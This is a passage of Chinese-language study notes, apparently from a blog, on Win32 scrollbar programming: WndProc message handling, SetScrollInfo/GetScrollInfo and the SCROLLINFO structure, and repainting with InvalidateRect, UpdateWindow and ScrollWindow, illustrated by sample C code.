class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> iVscrollPos;<span class="comment">//记录滑块位置</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxClient, cyClient;</span><br><span class="line">	TEXTMETRIC tm;</span><br><span class="line">	HDC hdc;</span><br><span class="line">	PAINTSTRUCT ps;</span><br><span class="line">	<span class="type">int</span> i,y;</span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">	RECT rect;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span> (message) &#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);</span><br><span class="line">		cxChar = tm.tmAveCharWidth;</span><br><span class="line">		cxCaps = cxChar;</span><br><span class="line">		<span class="keyword">if</span> (tm.tmPitchAndFamily &amp; <span class="number">1</span>) &#123;</span><br><span class="line">			cxCaps = cxChar * <span class="number">3</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line"></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_SIZE:</span><br><span class="line">		cxClient = LOWORD(lParam);</span><br><span class="line">		cyClient = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_VSCROLL:</span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEUP:<span class="comment">//点击滚动条顶端的箭头导致滑块垂直位置上移一个单元</span></span><br><span class="line">				iVscrollPos -= <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEDOWN:</span><br><span class="line">			iVscrollPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEUP:<span class="comment">//点击滑块的滑道导致滑块垂直位移一页</span></span><br><span class="line">			iVscrollPos -= cyClient / cyChar;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEDOWN:</span><br><span class="line">			iVscrollPos += cyClient / cyChar;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBPOSITION:<span class="comment">//拖动滑块,其位置应该由wParam的高位字决定</span></span><br><span class="line">			iVscrollPos = HIWORD(wParam);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		iVscrollPos = max(<span class="number">0</span>, min(iVscrollPos, NUMLINES - <span class="number">1</span>));<span class="comment">//iVscrollPos不允许小于0,不允许比NUMLINES行大</span></span><br><span class="line">		<span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;<span class="comment">//测试一下本次滚动之后和上一次的位置是否相同,相同则不做修改</span></span><br><span class="line">			SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</span><br><span class="line">			InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);<span class="comment">//本次滚动条动作处理完毕,整个窗口无效化,强制产生WM_PAINT消息,进行重绘处理</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd,&amp;ps);</span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; NUMLINES; ++i) &#123;<span class="comment">//i最大不能超过现有行数</span></span><br><span class="line">			y = cyChar * (i - iVscrollPos);<span class="comment">//原来的第i行应该在客户区的第i-iVescrollPos行打印</span></span><br><span class="line">			TextOut(hdc, <span class="number">10</span>, y, sysmetrics[i].szLabel,lstrlen(sysmetrics[i].szLabel));</span><br><span class="line">			TextOut(hdc, <span class="number">40</span> * cxCaps, y, sysmetrics[i].szDesc, lstrlen(sysmetrics[i].szDesc));</span><br><span class="line">			wsprintf(szBuffer, TEXT(<span class="string">&quot;%5d&quot;</span>), GetSystemMetrics(sysmetrics[i].Index));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">			TextOut(hdc, <span class="number">80</span> * cxCaps, y, szBuffer, lstrlen(szBuffer));</span><br><span class="line">			SetTextAlign(hdc, TA_LEFT);</span><br><span class="line">		&#125;	</span><br><span class="line">		EndPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">		GetClientRect(hwnd, &amp;rect);</span><br><span class="line">		wsprintf(szBuffer, TEXT(<span class="string">&quot;%d&quot;</span>),cxClient);</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, szBuffer,TEXT(<span class="string">&quot;notice&quot;</span>), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">		PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>关于绘图时的处理<code>y = cyChar * (i - iVscrollPos);</code>实际上干了一个将第i条作为客户区的第i-iVscrollPos行打印</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808084718857.png"
alt="image-20220808084718857" />
<figcaption aria-hidden="true">image-20220808084718857</figcaption>
</figure>
</blockquote>
<h4 id="立刻重绘-1">立刻重绘</h4>
<p>处理WM_VSCROLL时并没有立刻重绘客户区,而是调用InvalidateRect将这个皮球踢到下一次消息处理,WM_PAINT的处理.</p>
<p>WM_PAINT这个消息的优先级最低,当窗口过程的消息队列中有多种消息(比如多种对窗口有改动的消息)时,会首先处理其他消息,最后才会处理WM_PAINT消息.</p>
<blockquote>
<p>这就好比市领导要求某中学视察,苦逼老师们提前一周就得造假材料,补完教案.等这一些都忙活完了,到领导视察当天,把所有材料一汇总,呈递给领导审阅</p>
<p>造材料就相当于处理其他消息</p>
<p>处理WM_PAINT就是呈递的临门一脚</p>
</blockquote>
<p>如果要让WM_PAINT立刻被处理,需要在InvalidateRect之后立刻UpdateWindow</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;</span><br><span class="line">	SetScrollPos(hwnd, SB_VERT, iVscrollPos, TRUE);</span><br><span class="line">	InvalidateRect(hwnd, NULL, TRUE);</span><br><span class="line">	UpdateWindow(hwnd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="getsetscrollinfo">Get/SetScrollInfo</h3>
<p>先前的窗口中,滑块的大小是固定的,那么一小点都点不到.</p>
<p>而人家的滑块似乎是和总行数挂钩的,总行数越少滑块越大</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808091255112.png"
alt="image-20220808091255112" />
<figcaption aria-hidden="true">image-20220808091255112</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220808091242529.png"
alt="image-20220808091242529" />
<figcaption aria-hidden="true">image-20220808091242529</figcaption>
</figure>
<p>确实如此,理论上可以得到一个公式 <span class="math display">\[
\frac{滑块大小}{滚动条长度}=\frac{页面大小}{范围}=\frac{文档显示数量}{文档总大小}
\]</span></p>
<p><del>我们先进的Set/GetScrollInfo函数已经超过了老式的Set/GetScrollRange,Set/GetScrollPos函数</del>Set/GetScrollInfo就可以考虑这一点了</p>
<p>使用Set/GetScrollInfo完全可以做到先前的老式函数.</p>
<p>这俩函数可以设置/获得滚动条的所有信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagSCROLLINFO</span> &#123;</span><span class="comment">//SCROLLINFO结构体</span></span><br><span class="line">  UINT cbSize;<span class="comment">//sizeof(SCROLLINFO)</span></span><br><span class="line">  UINT fMask;<span class="comment">//要设置或者获取的值</span></span><br><span class="line">  <span class="type">int</span>  nMin;<span class="comment">//范围最小值</span></span><br><span class="line">  <span class="type">int</span>  nMax;<span class="comment">//范围最大值</span></span><br><span class="line">  UINT nPage;<span class="comment">//页面大小</span></span><br><span class="line">  <span class="type">int</span>  nPos;<span class="comment">//当前位置</span></span><br><span class="line">  <span class="type">int</span>  nTrackPos;<span class="comment">//当前追踪位置</span></span><br><span class="line">&#125; SCROLLINFO, *LPSCROLLINFO;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">SetScrollInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HWND          hwnd,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span>           nBar,<span class="comment">//要么是SB_VERT,要么是SB_HORZ,作用是决定滑块是水平还是垂直的</span></span></span><br><span class="line"><span class="params">  [in] LPCSCROLLINFO lpsi,<span class="comment">//lpsi规定了ScrollInfo结构体应该被设置成什么状态</span></span></span><br><span class="line"><span class="params">  [in] BOOL          redraw<span class="comment">//表示是否重绘滚动条</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line">BOOL <span class="title function_">GetScrollInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HWND         hwnd,</span></span><br><span class="line"><span class="params">  [in]      <span class="type">int</span>          nBar,</span></span><br><span class="line"><span class="params">  [in, out] LPSCROLLINFO lpsi<span class="comment">//返回值用引用承载</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<p>奇怪的是,结构体的第一个成员是自己的大小,这不随便用<code>sizeof</code>一算就有了吗?</p>
<p>windows程序设计给出的解释是,方便以后扩充结构使用</p>
<blockquote>
<p>使用该结构体之前需要ixan将cbSize字段填充</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCROLLINFO si;</span><br><span class="line">si.cbSize=<span class="keyword">sizeof</span>(SCROLLINFO);</span><br></pre></td></tr></table></figure>
<p>真™抽象</p>
</blockquote>
<p>fMask有效值:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_RANGE 0x0001<span class="comment">//范围掩码,获取SCROLLINFO.nMIn,.mMax</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_PAGE 0x0002<span class="comment">//页面大小掩码,获取SCROLLINFO.nPage</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_POS 0x0004<span class="comment">//滑块位置掩码,获取SCROLLINFO.nPos</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_DISABLENOSCROLL 0x0008</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_TRACKPOS 0x0010</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIF_ALL (SIF_RANGE | SIF_PAGE | SIF_POS | SIF_TRACKPOS)</span></span><br></pre></td></tr></table></figure>
<p>不管是使用Set还是GetScrollInfo方法,引用传递的lpsi参数都要指定fMask这个成员</p>
<p>对于GetScrollInfo方法,指定了fMask=SIF_POS
,那么函数执行后lpsi引用的nPos就是有效值,其他成员无效</p>
<p>对于SetScrollInfo方法,指定了fMask=SIF_POS,那么函数根据lpsi的nPos值修改滚动条参数.其他成员不予理睬</p>
<h5 id="修改滑块位置">修改滑块位置</h5>
<p>使用SetScrollInfo改进的WM_CREATE处理函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> SCROLLINFO si;</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">		<span class="keyword">if</span> (iVscrollPos != GetScrollPos(hwnd, SB_VERT)) &#123;</span><br><span class="line">			si.fMask = SIF_POS;<span class="comment">//设置掩码,只改变nPos参数</span></span><br><span class="line">			SetScrollInfo(hwnd, SB_VERT, &amp;si, FALSE);<span class="comment">//不立刻重绘</span></span><br><span class="line">			InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h5 id="设置滚动条范围-1">设置滚动条范围</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_SIZE:</span><br><span class="line">	cxClient = LOWORD(lParam);</span><br><span class="line">	cyClient = HIWORD(lParam);</span><br><span class="line">	si.fMask = SIF_RANGE | SIF_PAGE;</span><br><span class="line">	si.nMin = <span class="number">0</span>;</span><br><span class="line">	si.nMax = NUMLINES - <span class="number">1</span>;</span><br><span class="line">	si.nPage = cyClient / cyChar;</span><br><span class="line">	SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);</span><br><span class="line">	<span class="comment">//iVscrollMax = max(0, NUMLINES - cyClient / cyChar);老方法</span></span><br><span class="line">	<span class="comment">//SetScrollRange(hwnd, SB_VERT, 0, iVscrollMax, TRUE);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>虽然我们传递的<code>si.nMax=NUMLINES-1</code>但是Windows操作系统会自动将滚动条范围最大值设置为<code>si.nMax-si.nPage+1</code>,这就是SetScrollInfo函数相对于SetScrollRange的好处</p>
<h3 id="更完善的滑动效果">更完善的滑动效果</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK <span class="title function_">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> cxChar, cxCaps, cyChar, cxClient, cyClient, iMaxWidth;<span class="comment">//字母宽度,大写字母宽度,行高度,客户区宽度,客户区高度,期望的最长宽度 //单位全是像素</span></span><br><span class="line">	HDC hdc;</span><br><span class="line">	<span class="type">int</span> i, x, y, iVertPos, iHorzPos, iPaintBeg, iPaintEnd;<span class="comment">//循环变量,绘制起点x,绘制起点y,竖直滑块位置,水平滑块位置,需要开始绘制的行号,需要结束绘制的行号</span></span><br><span class="line">	PAINTSTRUCT ps;</span><br><span class="line">	SCROLLINFO si;</span><br><span class="line">	TCHAR szBuffer[<span class="number">10</span>];</span><br><span class="line">	TEXTMETRIC tm;</span><br><span class="line">	RECT rect;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (message) &#123;</span><br><span class="line">	<span class="keyword">case</span> WM_CREATE:</span><br><span class="line"></span><br><span class="line">		hdc = GetDC(hwnd);</span><br><span class="line">		GetTextMetrics(hdc, &amp;tm);<span class="comment">//获取系统字体属性</span></span><br><span class="line">		cxChar = tm.tmAveCharWidth;</span><br><span class="line">		cxCaps = cxChar;</span><br><span class="line">		<span class="keyword">if</span> (tm.tmPitchAndFamily &amp; <span class="number">1</span>) &#123;</span><br><span class="line">			cxCaps = cxChar * <span class="number">3</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cyChar = tm.tmHeight + tm.tmExternalLeading;</span><br><span class="line"></span><br><span class="line">		ReleaseDC(hwnd, hdc);</span><br><span class="line">		iMaxWidth = <span class="number">40</span> * cxChar + <span class="number">22</span> * cxCaps;<span class="comment">//初始化期望的最长宽度,以后就当作常数使用了</span></span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">case</span> WM_SIZE:</span><br><span class="line">		cxClient = LOWORD(lParam);<span class="comment">//获取实时客户区宽度</span></span><br><span class="line">		cyClient = HIWORD(lParam);<span class="comment">//获取实时客户区高度</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="comment">//设置竖直滚动条属性</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);<span class="comment">//初始化si结构体</span></span><br><span class="line">		si.fMask = SIF_RANGE | SIF_PAGE;<span class="comment">//设置访问掩码</span></span><br><span class="line">		si.nMin = <span class="number">0</span>;<span class="comment">//设置滚动条范围上限为0</span></span><br><span class="line">		si.nMax = NUMLINES - <span class="number">1</span>;<span class="comment">//设置滚动条下限为NUMLINES-1</span></span><br><span class="line">		si.nPage = cyClient / cyChar;<span class="comment">//设置滚动条滚一页(一页=客户区一屏)的行数,客户区高度/一行的高度=客户区行数</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);<span class="comment">//注册滚动条信息</span></span><br><span class="line">		</span><br><span class="line">		<span class="comment">//设置水平滚动条属性</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);<span class="comment">//初始化si结构体</span></span><br><span class="line">		si.fMask = SIF_RANGE | SIF_PAGE;<span class="comment">//设置访问掩码</span></span><br><span class="line">		si.nMin = <span class="number">0</span>;</span><br><span class="line">		si.nMax = <span class="number">2</span> + iMaxWidth / cxChar;<span class="comment">//水平一页的宽度</span></span><br><span class="line">		si.nPage = cxClient / cxChar;<span class="comment">//客户区宽度➗字符宽度=一行可以有多少个字符</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_HORZ, &amp;si, TRUE);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_VSCROLL:</span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_ALL;<span class="comment">//设置访问掩码</span></span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line">		iVertPos = si.nPos;<span class="comment">//iVertPos记录修改之前的si.nPos滑块位置</span></span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_TOP:</span><br><span class="line">			si.nPos = si.nMax;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_BOTTOM:</span><br><span class="line">			si.nPos = si.nMin;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEUP:</span><br><span class="line">			si.nPos -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINEDOWN:</span><br><span class="line">			si.nPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEUP:</span><br><span class="line">			si.nPos -= si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGEDOWN:</span><br><span class="line">			si.nPos += si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBTRACK:<span class="comment">//TRACK会一直跟踪鼠标位置</span></span><br><span class="line">			si.nPos = si.nTrackPos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		si.fMask = SIF_POS;<span class="comment">//设置访问掩码,修改滚动条的滑块位置信息</span></span><br><span class="line">		SetScrollInfo(hwnd, SB_VERT, &amp;si, TRUE);</span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (si.nPos != iVertPos) &#123;<span class="comment">//比较本次修改前后si.nPos是否发生了变化</span></span><br><span class="line">			<span class="comment">//如果发生了变化则立刻通知重绘</span></span><br><span class="line">			ScrollWindow(hwnd, <span class="number">0</span>, cyChar * (iVertPos - si.nPos), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_HSCROLL:</span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_ALL;</span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		iHorzPos = si.nPos;</span><br><span class="line">		<span class="keyword">switch</span> (LOWORD(wParam)) &#123;</span><br><span class="line">		<span class="keyword">case</span> SB_LINERIGHT:</span><br><span class="line">			si.nPos += <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_LINELEFT:</span><br><span class="line">			si.nPos -= <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGELEFT:</span><br><span class="line">			si.nPos -= si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_PAGERIGHT:</span><br><span class="line">			si.nPos += si.nPage;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> SB_THUMBPOSITION:<span class="comment">//POSITION只会在鼠标松开时才更新位置</span></span><br><span class="line">			si.nPos = si.nTrackPos;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		si.fMask = SIF_POS;</span><br><span class="line">		SetScrollInfo(hwnd, SB_HORZ, &amp;si, TRUE);</span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		<span class="keyword">if</span> (si.nPos != iHorzPos) &#123;</span><br><span class="line">			ScrollWindow(hwnd, cxChar * (iHorzPos - si.nPos), <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">			UpdateWindow(hwnd);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> WM_PAINT:</span><br><span class="line">		hdc = BeginPaint(hwnd,&amp;ps);<span class="comment">//ps包含了当前客户区信息</span></span><br><span class="line">		si.cbSize = <span class="keyword">sizeof</span>(si);</span><br><span class="line">		si.fMask = SIF_POS;</span><br><span class="line">		GetScrollInfo(hwnd, SB_VERT, &amp;si);</span><br><span class="line">		iVertPos = si.nPos;<span class="comment">//获取当前滑块位置</span></span><br><span class="line">		GetScrollInfo(hwnd, SB_HORZ, &amp;si);</span><br><span class="line">		iHorzPos = si.nPos;</span><br><span class="line">		iPaintBeg = max(<span class="number">0</span>, iVertPos + ps.rcPaint.top / cyChar);<span class="comment">//计算绘制第几行</span></span><br><span class="line">		iPaintEnd = min(NUMLINES - <span class="number">1</span>, iVertPos + ps.rcPaint.bottom / cyChar);</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span> (i = iPaintBeg; i &lt;= 